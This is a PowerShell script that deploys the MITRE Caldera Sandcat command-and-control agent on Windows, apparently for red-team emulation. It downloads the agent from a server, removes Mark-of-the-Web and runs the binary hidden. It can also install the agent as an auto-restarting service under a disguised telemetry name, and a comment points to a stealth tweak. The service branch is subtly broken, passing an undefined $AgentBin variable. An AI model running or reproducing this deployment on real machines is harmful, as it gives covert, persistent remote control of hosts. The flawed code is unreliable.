#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Deploys and launches the MITRE Caldera Sandcat agent on a Windows machine.

.DESCRIPTION
    Downloads the Sandcat agent binary from a running Caldera server,
    configures it, and optionally installs it as a persistent Windows service.

.PARAMETER CalderaServer
    The URL (with port) of the running Caldera server.
    Example: http://192.168.1.100:8888

.PARAMETER Group
    The agent group to join. Defaults to "red".

.PARAMETER C2Channel
    The C2 contact channel to use. Options: http, udp, tcp, websocket.
    Defaults to "http".

.PARAMETER InstallAsService
    If specified, installs the agent as a persistent Windows service.

.PARAMETER ServiceName
    Name of the Windows service if -InstallAsService is used.
    Defaults to "CalderaSandcat".

.PARAMETER AgentPath
    Local path where the agent binary will be saved.
    Defaults to C:\Windows\Temp\sandcat.exe

.PARAMETER Proxy
    Optional HTTP proxy URL for agent beacon traffic.
    Example: http://proxy.corp.local:8080

.EXAMPLE
    # Basic one-time execution
    .\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.1.100:8888"

.EXAMPLE
    # Install as a persistent service with a custom group
    .\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.1.100:8888" `
        -Group "blue" -InstallAsService -ServiceName "WinTelemetryHelper"

.EXAMPLE
    # Use WebSocket C2 channel
    .\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.1.100:8888" `
        -C2Channel "websocket" -Group "red"
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidatePattern('^https?://')]
    [string]$CalderaServer,

    [Parameter(Mandatory = $false)]
    [string]$Group = "red",

    [Parameter(Mandatory = $false)]
    [ValidateSet("http", "udp", "tcp", "websocket")]
    [string]$C2Channel = "http",

    [Parameter(Mandatory = $false)]
    [switch]$InstallAsService,

    [Parameter(Mandatory = $false)]
    [string]$ServiceName = "CalderaSandcat",

    [Parameter(Mandatory = $false)]
    [string]$AgentPath = "C:\Windows\Temp\sandcat.exe",

    [Parameter(Mandatory = $false)]
    [string]$Proxy = ""
)

# ──────────────────────────────────────────────────────────────
# Helper: Write colored status messages
# ──────────────────────────────────────────────────────────────
function Write-Status {
    param([string]$Message, [string]$Level = "INFO")
    $colors = @{ INFO = "Cyan"; OK = "Green"; WARN = "Yellow"; ERROR = "Red" }
    $color  = $colors[$Level]
    $ts     = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "[$ts] [$Level] $Message" -ForegroundColor $color
}

# ──────────────────────────────────────────────────────────────
# Helper: Download agent binary from Caldera server
# ──────────────────────────────────────────────────────────────
function Get-SandcatBinary {
    param([string]$Server, [string]$Destination)

    # Caldera serves the pre-compiled agent at this endpoint
    $downloadUrl = "$Server/file/download"

    Write-Status "Downloading Sandcat agent from: $downloadUrl"

    try {
        $headers = @{
            "file"     = "sandcat.go"
            "platform" = "windows"
        }

        # Use TLS 1.2 for compatibility
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

        $webClient = New-Object System.Net.WebClient
        foreach ($key in $headers.Keys) {
            $webClient.Headers.Add($key, $headers[$key])
        }

        if ($Proxy) {
            $webProxy = New-Object System.Net.WebProxy($Proxy, $true)
            $webClient.Proxy = $webProxy
            Write-Status "Using proxy: $Proxy"
        }

        $webClient.DownloadFile($downloadUrl, $Destination)

        if (Test-Path $Destination) {
            $size = (Get-Item $Destination).Length
            Write-Status "Agent saved to '$Destination' ($size bytes)" -Level "OK"
            return $true
        } else {
            Write-Status "Download succeeded but file not found at '$Destination'" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Status "Failed to download agent: $_" -Level "ERROR"
        return $false
    }
}

# ──────────────────────────────────────────────────────────────
# Helper: Run agent as a one-time foreground/background process
# ──────────────────────────────────────────────────────────────
function Start-SandcatProcess {
    param(
        [string]$AgentBin,
        [string]$Server,
        [string]$Group,
        [string]$C2
    )

    $args = @(
        "-server", $Server,
        "-group",  $Group,
        "-v"                      # verbose flag; remove for stealth
    )

    # Contact channel flag name varies by Caldera version
    if ($C2 -ne "http") {
        $args += @("-contact", $C2)
    }

    Write-Status "Launching agent process..."
    Write-Status "  Binary : $AgentBin"
    Write-Status "  Server : $Server"
    Write-Status "  Group  : $Group"
    Write-Status "  C2     : $C2"

    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName               = $AgentBin
        $psi.Arguments              = $args -join " "
        $psi.UseShellExecute        = $false
        $psi.RedirectStandardOutput = $false
        $psi.RedirectStandardError  = $false
        $psi.WindowStyle            = [System.Diagnostics.ProcessWindowStyle]::Hidden

        $proc = [System.Diagnostics.Process]::Start($psi)
        Write-Status "Agent started with PID: $($proc.Id)" -Level "OK"
        return $proc
    }
    catch {
        Write-Status "Failed to start agent process: $_" -Level "ERROR"
        return $null
    }
}

# ──────────────────────────────────────────────────────────────
# Helper: Install agent as a persistent Windows service
#         Uses NSSM if available, otherwise sc.exe wrapper
# ──────────────────────────────────────────────────────────────
function Install-SandcatService {
    param(
        [string]$Name,
        [string]$AgentBin,
        [string]$Server,
        [string]$Group,
        [string]$C2
    )

    $agentArgs = "-server $Server -group $Group"
    if ($C2 -ne "http") { $agentArgs += " -contact $C2" }

    # ── Option A: Use NSSM (recommended) ──────────────────────
    $nssm = Get-Command "nssm.exe" -ErrorAction SilentlyContinue
    if ($nssm) {
        Write-Status "NSSM found – installing service via NSSM"
        & nssm install $Name $AgentBin $agentArgs
        & nssm set    $Name Start SERVICE_AUTO_START
        & nssm set    $Name AppRestartDelay 5000
        & nssm start  $Name
        Write-Status "Service '$Name' installed and started via NSSM" -Level "OK"
        return
    }

    # ── Option B: sc.exe + a wrapper batch file ───────────────
    Write-Status "NSSM not found – using sc.exe with a wrapper batch" -Level "WARN"

    $wrapperPath = [System.IO.Path]::ChangeExtension($AgentBin, ".bat")
    $wrapperContent = @"
@echo off
:loop
"$AgentBin" $agentArgs
timeout /t 10 /nobreak >nul
goto loop
"@
    Set-Content -Path $wrapperPath -Value $wrapperContent -Encoding ASCII

    # Windows services cannot directly run .exe without a service host;
    # use cmd.exe as the service binary and pass the wrapper as argument.
    $binPath = "cmd.exe /c `"$wrapperPath`""

    sc.exe create $Name binPath= $binPath start= auto DisplayName= $Name | Out-Null
    sc.exe description $Name "System telemetry service" | Out-Null
    sc.exe start $Name | Out-Null

    $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
    if ($svc) {
        Write-Status "Service '$Name' installed and started via sc.exe" -Level "OK"
    } else {
        Write-Status "Service installation may have failed – check sc.exe output" -Level "WARN"
    }
}

# ──────────────────────────────────────────────────────────────
# Helper: Remove an existing service before reinstalling
# ──────────────────────────────────────────────────────────────
function Remove-ExistingService {
    param([string]$Name)
    $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
    if ($svc) {
        Write-Status "Stopping and removing existing service '$Name'" -Level "WARN"
        Stop-Service -Name $Name -Force -ErrorAction SilentlyContinue
        sc.exe delete $Name | Out-Null
        Start-Sleep -Seconds 2
    }
}

# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

Write-Status "═══════════════════════════════════════════════"
Write-Status " MITRE Caldera – Sandcat Agent Deployer"
Write-Status " Target server : $CalderaServer"
Write-Status " Group         : $Group"
Write-Status " C2 channel    : $C2Channel"
Write-Status " Agent path    : $AgentPath"
Write-Status "═══════════════════════════════════════════════"

# 1. Confirm the Caldera server is reachable
Write-Status "Checking connectivity to Caldera server..."
try {
    $ping = Invoke-WebRequest -Uri "$CalderaServer/ping" `
        -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
    Write-Status "Server responded (HTTP $($ping.StatusCode))" -Level "OK"
}
catch {
    Write-Status "Cannot reach Caldera server at '$CalderaServer'. Check the URL and firewall rules." -Level "ERROR"
    exit 1
}

# 2. Download the binary (skip if already present and user is just re-running)
if (Test-Path $AgentPath) {
    Write-Status "Agent binary already exists at '$AgentPath' – skipping download" -Level "WARN"
} else {
    $downloaded = Get-SandcatBinary -Server $CalderaServer -Destination $AgentPath
    if (-not $downloaded) {
        Write-Status "Aborting – could not obtain agent binary." -Level "ERROR"
        exit 1
    }
}

# 3. Unblock the file (removes the Mark-of-the-Web if downloaded via browser/webClient)
Unblock-File -Path $AgentPath -ErrorAction SilentlyContinue

# 4a. Install as service
if ($InstallAsService) {
    Remove-ExistingService -Name $ServiceName
    Install-SandcatService -Name $ServiceName `
        -AgentBin $AgentBin `
        -Server   $CalderaServer `
        -Group    $Group `
        -C2       $C2Channel

# 4b. Run as a background process (default)
} else {
    $proc = Start-SandcatProcess -AgentBin  $AgentPath `
                                  -Server    $CalderaServer `
                                  -Group     $Group `
                                  -C2        $C2Channel
    if ($proc) {
        Write-Status "Agent is running. Monitor it in the Caldera web UI." -Level "OK"
        Write-Status "To stop the agent, run: Stop-Process -Id $($proc.Id)" -Level "INFO"
    }
}

Write-Status "Deployment complete." -Level "OK"
